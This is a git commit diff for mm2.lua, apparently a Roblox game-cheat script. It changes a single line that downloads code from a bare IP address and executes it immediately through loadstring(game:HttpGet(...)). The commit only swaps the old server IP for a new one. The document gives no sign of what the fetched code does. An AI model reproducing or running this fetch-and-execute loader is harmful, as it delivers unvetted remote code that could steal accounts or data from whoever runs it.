4a2293c31d73518a15edbdbc4be8c5942df3eb50
proplayer123-z <idkfrcap@gmail.com>
2026-02-22 15:38:05 +0800

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdlOGQ5MWM3LTYwMmMtNDVjNy05YzFkLTQ5YjhiZDJjYzgyNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjdlOGQ5MWM3LTYwMmMtNDVjNy05YzFkLTQ5YjhiZDJjYzgyNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
